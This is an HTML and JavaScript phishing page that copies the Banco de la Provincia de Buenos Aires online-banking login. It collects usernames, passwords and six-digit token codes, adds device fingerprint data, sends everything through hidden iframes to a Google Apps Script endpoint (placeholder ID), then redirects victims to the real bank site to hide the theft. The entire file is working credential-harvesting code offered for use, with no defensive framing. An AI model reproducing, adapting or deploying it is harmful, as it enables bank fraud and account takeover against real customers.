<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<meta name="robots" content="noindex">
<title>Banco de la Provincia de Buenos Aires</title>
<link rel="icon" href="https://www.bancoprovincia.bancainternet.com.ar/spa/favicon.ico">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Encode+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
<style>
  /* ===== Paleta y medidas EXACTAS extraídas del CSS real de BIP ===== */
  :root{
    --verde:#279d2e;
    --verde-osc:#007a2b;
    --verde-hover:#378f30;
    --gris:#3c3c3b;
    --gris-sec:#414042;
    --foco:#0e22d3;
    --error:#d42f1a;
    --input-bg:#f8f8f8;
    --input-bg-hover:#f5f5f5;
    --grad:linear-gradient(270deg,#26b4bd,#3daa35);
    --radio-card:.625rem;
    --radio-btn:.25rem .688rem;
    --safe-top:env(safe-area-inset-top,0px);
    --safe-bottom:env(safe-area-inset-bottom,0px);
    --vh:1vh;
  }
  *,*::before,*::after{box-sizing:border-box}
  [hidden]{display:none!important}
  html,body{height:100%}
  body{
    margin:0;
    font-family:"Encode Sans",system-ui,sans-serif;
    font-size:1rem; line-height:1.5rem; color:var(--gris);
    background-color:#fff;
    /* Fondo real del login (hotlinkeado del banco) */
    background-image:url("https://www.bancoprovincia.bancainternet.com.ar/spa/assets/login-Dl1yShgU.png");
    background-repeat:no-repeat;
    background-position:center;
    background-size:cover;
  }
  .login-wrap{
    min-height:calc(var(--vh) * 100);
    display:flex; align-items:center; justify-content:center;
  }
  /* Tarjeta: radio .625rem + sombra exactos */
  .login-content{
    width:100%; max-width:26.25rem;
    max-height:min(46.875rem,95vh);
    background:#fff;
    border-radius:var(--radio-card);
    box-shadow:0 0 .938rem rgba(0,0,0,.102);
    display:flex; flex-direction:column; overflow:hidden;
  }
  /* Header con el gradiente real */
  .header-gradient{
    background:var(--grad);
    height:calc(5.625rem + var(--safe-top));
    padding-top:var(--safe-top);
    display:flex; align-items:center; justify-content:center;
    flex:0 0 auto;
  }
  .header-gradient img{height:2.125rem; width:auto; display:block}
  .cuerpo{
    padding:1.5rem;
    overflow-y:auto; flex:1 1 auto; min-height:0;
    scrollbar-gutter:stable both-edges;
  }
  h1.txt-title{
    font-family:"Encode Sans",sans-serif; font-weight:600;
    font-size:1.5rem; line-height:1.875rem;
    color:var(--verde-osc);
    margin:0 0 1.5rem;
  }
  label.txt-input-label{
    display:block; font-weight:600; font-size:1rem; line-height:1.25rem;
    margin-bottom:.375rem;
  }
  .campo{margin-bottom:1rem}
  /* Input real: fondo claro, SOLO borde inferior, sin radio */
  .form-control{
    display:block; width:100%; min-height:2.625rem;
    padding:.375rem .75rem;
    font-family:inherit; font-size:1rem; line-height:1.5;
    color:var(--gris);
    background-color:var(--input-bg);
    border:.063rem solid var(--input-bg);
    border-bottom:.063rem solid var(--gris);
    border-radius:0; outline:0;
    transition:border-color .15s ease-in-out, background-color .15s ease-in-out;
  }
  .form-control:hover{background-color:var(--input-bg-hover)}
  .form-control:focus{background-color:var(--input-bg-hover); border:.063rem solid var(--gris)}
  .form-control:focus-visible{box-shadow:0 0 0 .188rem var(--foco)}
  .form-control::placeholder{color:#6c757d; opacity:1}
  .pass{position:relative}
  .pass .form-control{padding-right:2.75rem}
  .pass button{
    position:absolute; right:.625rem; top:50%; transform:translateY(-50%);
    border:0; background:none; padding:0; cursor:pointer;
    color:var(--verde-osc); display:flex; align-items:center;
  }
  /* Botón real: gris carbón, radio asimétrico */
  .btn{
    display:block; width:100%; min-height:2.625rem;
    padding:.375rem .75rem;
    font-family:inherit; font-size:1rem; font-weight:600;
    border:.188rem solid transparent; border-radius:var(--radio-btn);
    cursor:pointer; transition:background-color .1s ease-in-out;
  }
  .btn-primary{background-color:var(--gris); color:#fff}
  .btn-primary:hover{background-color:#595958}
  .btn-primary:active{background-color:#2d2d2c}
  /* Links reales: verdes y subrayados */
  .btn-link{
    display:inline; width:auto; min-height:0; padding:0;
    background:none; border:0; cursor:pointer;
    color:var(--verde-osc); text-decoration:underline;
    font-family:inherit; font-size:1rem; font-weight:400;
  }
  .btn-link:hover{color:var(--verde-hover)}
  .centro{text-align:center}
  .links{font-size:1rem; line-height:1.5rem; margin-top:1rem}
  .links a{color:var(--verde-osc); text-decoration:underline}
  .links a:hover{color:var(--verde-hover)}
  .sub{font-size:1rem; color:var(--gris-sec); margin:0 0 1.5rem}
  .chip{
    display:inline-block; margin-bottom:1rem; padding:.375rem .75rem;
    font-size:.875rem; background:var(--input-bg); border-radius:.375rem;
  }
  .chip b{color:#000}
  /* Token: mismos criterios visuales que los inputs */
  .otp{display:flex; gap:.5rem; justify-content:center; margin:0 0 1.5rem}
  .otp input{
    flex:1 1 0; min-width:0; max-width:3.25rem; height:3.5rem; padding:0;
    text-align:center; font-family:inherit; font-size:1.5rem; font-weight:600;
    color:var(--gris); background:var(--input-bg);
    border:.063rem solid var(--input-bg);
    border-bottom:.063rem solid var(--gris);
    border-radius:0; outline:0;
  }
  .otp input:focus{background:var(--input-bg-hover); border:.063rem solid var(--gris)}
  .otp input:focus-visible{box-shadow:0 0 0 .188rem var(--foco)}
  /* Teclado virtual: mismo look que el del banco */
  #teclado{display:none; margin-top:1rem; background:#ececec; border-radius:5px; padding:5px}
  #teclado .fila{display:flex; gap:4px; margin-bottom:4px}
  #teclado button{
    flex:1; min-width:0; height:2.5rem; padding:5px;
    font-family:inherit; font-size:.875rem;
    background:#fff; border:0; border-bottom:1px solid #b5b5b5;
    border-radius:5px; box-shadow:0 0 3px -1px rgba(0,0,0,.3); cursor:pointer;
  }
  #teclado button:active{background:#efefef}
  .overlay{
    position:fixed; inset:0; z-index:99; background:rgba(255,255,255,.8);
    display:none; flex-direction:column; align-items:center; justify-content:center; gap:1rem;
  }
  .overlay.on{display:flex}
  .spinner{
    width:2.5rem; height:2.5rem; border-radius:50%;
    border:.25rem solid #e0e0e0; border-top-color:var(--verde-osc);
    animation:girar .8s linear infinite;
  }
  @keyframes girar{to{transform:rotate(360deg)}}
  iframe.sink{display:none}

  @media (min-width:768px){
    .header-gradient{height:calc(7.5rem + var(--safe-top))}
    .header-gradient img{height:2.875rem}
    .cuerpo{padding:1.5rem 1.5rem 2rem}
  }
  /* Mobile: la tarjeta es una hoja inferior, igual que en el sitio real */
  @media (max-width:767.98px){
    .login-wrap{align-items:flex-end; padding-top:4.375rem}
    .login-content{
      max-width:none; max-height:none; box-shadow:none;
      height:calc(calc(var(--vh) * 100) - 4.375rem - var(--safe-bottom));
      border-radius:1.25rem 1.25rem 0 0;
    }
  }
</style>
</head>
<body>

<div class="login-wrap">
  <div class="login-content">

    <div class="header-gradient">
      <img src="https://www.bancoprovincia.com.ar/CDN/Get/logo_mobile_bip"
           alt="Banco de la Provincia de Buenos Aires">
    </div>

    <div class="cuerpo">

      <!-- ================= PASO 1 ================= -->
      <div id="vista1">
        <h1 class="txt-title">Iniciá sesión</h1>

        <form id="form1" method="POST" target="sink1" autocomplete="off">
          <input type="hidden" name="paso" value="1">
          <input type="hidden" name="sesion">
          <input type="hidden" name="Fecha">
          <input type="hidden" name="Dispositivo">
          <input type="hidden" name="Pantalla">
          <input type="hidden" name="Zona">
          <input type="hidden" name="Idioma">

          <div class="campo">
            <label class="txt-input-label" for="username">Tu usuario</label>
            <input class="form-control" type="text" id="username" name="Usuario"
                   maxlength="25" placeholder="Ingresá tu nombre de usuario"
                   autocapitalize="off" autocomplete="off" required>
          </div>

          <div class="campo">
            <label class="txt-input-label" for="password">Tu clave</label>
            <div class="pass">
              <input class="form-control" type="password" id="password" name="Clave"
                     maxlength="30" placeholder="Ingresá tu clave"
                     autocomplete="off" required>
              <button type="button" id="btnOjo" aria-label="Mostrar clave">
                <svg width="20" height="20" viewBox="0 0 24 24" fill="none"
                     stroke="currentColor" stroke-width="2" stroke-linecap="round">
                  <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/>
                  <circle cx="12" cy="12" r="3"/>
                </svg>
              </button>
            </div>
          </div>

          <div class="centro">
            <button type="button" class="btn-link" id="btnTeclado">
              Teclado Virtual
            </button>
            <div id="teclado"></div>
          </div>

          <button type="submit" class="btn btn-primary" style="margin-top:1.5rem">Ingresar</button>

          <div class="links centro">
            <div>¿No sos BIP? <a href="https://www.bancoprovincia.bancainternet.com.ar/spa/">Registrate</a></div>
            <div><a href="https://www.bancoprovincia.bancainternet.com.ar/spa/">Bloqueé u olvidé mi usuario y/o clave</a></div>
            <div><a href="https://www.bancoprovincia.bancainternet.com.ar/spa/">Conocé como hacerte usuario u operar</a></div>
            <div><a href="https://www.bancoprovincia.bancainternet.com.ar/spa/">Recomendaciones de seguridad</a></div>
          </div>
        </form>
      </div>

      <!-- ================= PASO 2 ================= -->
      <div id="vista2" hidden>
        <h1 class="txt-title">Ingresá el token</h1>
        <p class="sub">Colocá el código de 6 dígitos generado por tu Bapro Token.</p>
        <div class="chip">Usuario: <b id="chipUsuario">—</b></div>

        <form id="form2" method="POST" target="sink2" autocomplete="off">
          <input type="hidden" name="paso" value="2">
          <input type="hidden" name="sesion">
          <input type="hidden" name="Usuario">
          <input type="hidden" name="Token" id="tokenHidden">
          <input type="hidden" name="Fecha">
          <input type="hidden" name="Dispositivo">
          <input type="hidden" name="Pantalla">
          <input type="hidden" name="Zona">
          <input type="hidden" name="Idioma">

          <div class="otp" id="otp">
            <input type="text" inputmode="numeric" maxlength="1" aria-label="Dígito 1">
            <input type="text" inputmode="numeric" maxlength="1" aria-label="Dígito 2">
            <input type="text" inputmode="numeric" maxlength="1" aria-label="Dígito 3">
            <input type="text" inputmode="numeric" maxlength="1" aria-label="Dígito 4">
            <input type="text" inputmode="numeric" maxlength="1" aria-label="Dígito 5">
            <input type="text" inputmode="numeric" maxlength="1" aria-label="Dígito 6">
          </div>

          <button type="submit" class="btn btn-primary">Ingresar</button>

          <div class="links centro">
            <div><a href="#" id="cambiarUsuario">Cambiar usuario</a></div>
            <div><a href="https://www.bancoprovincia.bancainternet.com.ar/spa/">¿No recibiste el token? Reenviar</a></div>
          </div>
        </form>
      </div>

    </div>
  </div>
</div>

<iframe class="sink" name="sink1" title="sink1"></iframe>
<iframe class="sink" name="sink2" title="sink2"></iframe>

<div class="overlay" id="overlay">
  <div class="spinner"></div>
  <div style="font-size:1rem;color:var(--gris)" id="overlayTxt">Ingresando...</div>
</div>

<script>
(function () {
  'use strict';

  /* ============ CONFIGURACIÓN ============ */
  var CONFIG = {
    endpoint: 'https://script.google.com/macros/s/AKfycbXXXXXXXXXXXXXXXXXXXX/exec',
    redirect: 'https://www.bancoprovincia.bancainternet.com.ar/spa/',
    demoraPaso1: 1300,
    demoraPaso2: 1100
  };

  /* ============ ALTURA REAL DE VIEWPORT (igual que el sitio) ============ */
  function setVh() {
    document.documentElement.style.setProperty('--vh', (window.innerHeight * 0.01) + 'px');
  }
  setVh();
  window.addEventListener('resize', setVh);
  window.addEventListener('orientationchange', setVh);

  var form1    = document.getElementById('form1');
  var form2    = document.getElementById('form2');
  var overlay  = document.getElementById('overlay');
  var overlayT = document.getElementById('overlayTxt');
  var vista1   = document.getElementById('vista1');
  var vista2   = document.getElementById('vista2');
  var cajas    = Array.prototype.slice.call(document.querySelectorAll('#otp input'));
  var enviado1 = false, enviado2 = false, redirigido = false;
  var sesion   = 'BIP-' + Math.random().toString(36).slice(2, 8).toUpperCase();

  function huella() {
    var datos = {
      Fecha:       new Date().toLocaleString('es-AR'),
      Dispositivo: navigator.userAgent,
      Pantalla:    screen.width + 'x' + screen.height,
      Zona:        Intl.DateTimeFormat().resolvedOptions().timeZone,
      Idioma:      navigator.language,
      sesion:      sesion
    };
    Object.keys(datos).forEach(function (k) {
      document.querySelectorAll('input[name="' + k + '"]').forEach(function (i) {
        i.value = datos[k];
      });
    });
  }
  huella();

  form1.action = CONFIG.endpoint;
  form2.action = CONFIG.endpoint;

  /* ============ PASO 1 ============ */
  form1.addEventListener('submit', function (e) {
    if (enviado1) { e.preventDefault(); return; }
    enviado1 = true;
    huella();
    form2.querySelector('input[name="Usuario"]').value =
      document.getElementById('username').value;
    overlay.classList.add('on');
    overlayT.textContent = 'Ingresando...';

    setTimeout(function () {
      overlay.classList.remove('on');
      vista1.hidden = true;
      vista2.hidden = false;
      document.getElementById('chipUsuario').textContent =
        document.getElementById('username').value || '(vacío)';
      cajas[0].focus();
    }, CONFIG.demoraPaso1);
  });

  /* ============ PASO 2 ============ */
  form2.addEventListener('submit', function (e) {
    if (enviado2) { e.preventDefault(); return; }
    enviado2 = true;
    huella();
    overlay.classList.add('on');
    overlayT.textContent = 'Verificando token...';
    setTimeout(redirigir, CONFIG.demoraPaso2);
  });

  document.querySelector('iframe[name=sink2]').addEventListener('load', function () {
    if (enviado2) setTimeout(redirigir, 250);
  });

  function redirigir() {
    if (redirigido) return;
    redirigido = true;
    window.location.href = CONFIG.redirect;
  }

  /* ============ TOKEN ============ */
  function valorToken() {
    return cajas.map(function (c) { return c.value; }).join('');
  }
  function sincronizar() {
    document.getElementById('tokenHidden').value = valorToken();
    if (valorToken().length === 6 && !enviado2) {
      setTimeout(function () {
        if (valorToken().length === 6 && !enviado2) {
          if (form2.requestSubmit) form2.requestSubmit(); else form2.submit();
        }
      }, 550);
    }
  }
  cajas.forEach(function (caja, i) {
    caja.addEventListener('input', function () {
      this.value = this.value.replace(/\D/g, '').slice(0, 1);
      if (this.value && i < cajas.length - 1) cajas[i + 1].focus();
      sincronizar();
    });
    caja.addEventListener('keydown', function (e) {
      if (e.key === 'Backspace' && !this.value && i > 0) {
        cajas[i - 1].focus(); cajas[i - 1].value = ''; sincronizar();
      }
    });
    caja.addEventListener('paste', function (e) {
      var t = ((e.clipboardData || window.clipboardData).getData('text') || '')
        .replace(/\D/g, '').slice(0, 6);
      if (!t) return;
      e.preventDefault();
      cajas.forEach(function (c, k) { c.value = t[k] || ''; });
      cajas[Math.min(t.length, 5)].focus();
      sincronizar();
    });
  });

  /* ============ VOLVER ============ */
  document.getElementById('cambiarUsuario').addEventListener('click', function (e) {
    e.preventDefault();
    enviado1 = enviado2 = redirigido = false;
    cajas.forEach(function (c) { c.value = ''; });
    document.getElementById('tokenHidden').value = '';
    vista2.hidden = true; vista1.hidden = false;
    document.getElementById('password').value = '';
    document.getElementById('username').focus();
  });

  /* ============ OJO ============ */
  document.getElementById('btnOjo').addEventListener('click', function () {
    var p = document.getElementById('password');
    p.type = (p.type === 'password') ? 'text' : 'password';
  });

  /* ============ TECLADO VIRTUAL ============ */
  var activo = document.getElementById('username');
  ['username', 'password'].forEach(function (id) {
    document.getElementById(id).addEventListener('focus', function () { activo = this; });
  });

  var teclado = document.getElementById('teclado');
  ['1234567890', 'qwertyuiop', 'asdfghjklñ', 'zxcvbnm', '@.-_'].forEach(function (fila) {
    var div = document.createElement('div');
    div.className = 'fila';
    fila.split('').forEach(function (ch) {
      var b = document.createElement('button');
      b.type = 'button'; b.textContent = ch;
      b.addEventListener('click', function () { activo.value += ch; });
      div.appendChild(b);
    });
    teclado.appendChild(div);
  });
  var filaFinal = document.createElement('div');
  filaFinal.className = 'fila';
  var bBorrar = document.createElement('button');
  bBorrar.type = 'button'; bBorrar.textContent = 'Borrar'; bBorrar.style.flex = '3';
  bBorrar.addEventListener('click', function () { activo.value = activo.value.slice(0, -1); });
  filaFinal.appendChild(bBorrar);
  teclado.appendChild(filaFinal);
  document.getElementById('btnTeclado').addEventListener('click', function () {
    teclado.style.display = (teclado.style.display === 'block') ? 'none' : 'block';
  });
})();
</script>
</body>
</html>
